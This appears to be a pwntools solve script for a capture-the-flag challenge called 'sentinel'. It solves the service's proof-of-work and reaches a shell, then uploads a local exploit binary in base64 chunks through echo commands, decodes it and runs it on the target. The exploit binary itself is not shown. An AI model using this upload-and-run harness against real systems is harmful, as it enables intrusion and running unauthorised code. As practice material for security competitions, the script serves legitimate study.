#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import string

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './share/guest_home/sentinel'
context.terminal = ['tmux', 'new-window']
argv = []
env = {}

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def create_instance():
    io.sendlineafter("Choice >", "1")
    io.recvuntil("sha256((")
    start = io.recvline()
    print(start)
    start = re.search(b"'(.*)' +", start)
    if args.HOST == "127.0.0.1":
        answer = "dummySecret"
    else:
        answer = solve_pow(start.group(1).decode())

    io.sendlineafter("answer >", answer)
    io.sendlineafter("secret >", "12345")

    io.recvuntil("instanceId :")

    _id = re.search(b" (.*) \(keep", io.recvline()).group(1)

    #make sure shell is rdy
    io.sendline("id")
    io.recvuntil("groups=1000(sentinel)\n")

    return _id

def solve_pow(start = None):
    start = start if start else 'YONroRFbdI'
    print("Solving with start: ", start)
    while True:
        answer = ''.join(random.choice(string.printable) for _ in range(0x4))
        if (int.from_bytes(hashlib.sha256((start + answer).encode()).digest(), byteorder='little') & ((1 << 24) - 1)) == 0:
            print("found answer: ", answer)
            return answer

def exec_cmd(cmd):
    #io.recvuntil("$ ")
    io.sendline(cmd)

def upload():
    p = log.progress("Upload")

    with open("./exp", "rb") as f:
        data = f.read()

    encoded = base64.b64encode(data).replace(b'\n',b'').decode()

    for i in range(0, len(encoded), 500):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /tmp/benc" % (encoded[i:i+500]))
        
    exec_cmd("cat /tmp/benc | base64 -d > /tmp/bout")    
    exec_cmd("chmod +x /tmp/bout")

    p.success()


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start(argv, env=env)

_id = create_instance()
print("instance id: ", _id)

upload()

io.sendline("/tmp/bout")

io.interactive()

'''
93f01cef6dd04ef68ba02be50fbd807f:
    flag dev: 125, flag ino: 13509744

eacc2b8d49d4492f825838dfa8582bc0:
    flag dev: 142, flag ino: 13509744

secret = kind of pw
'''
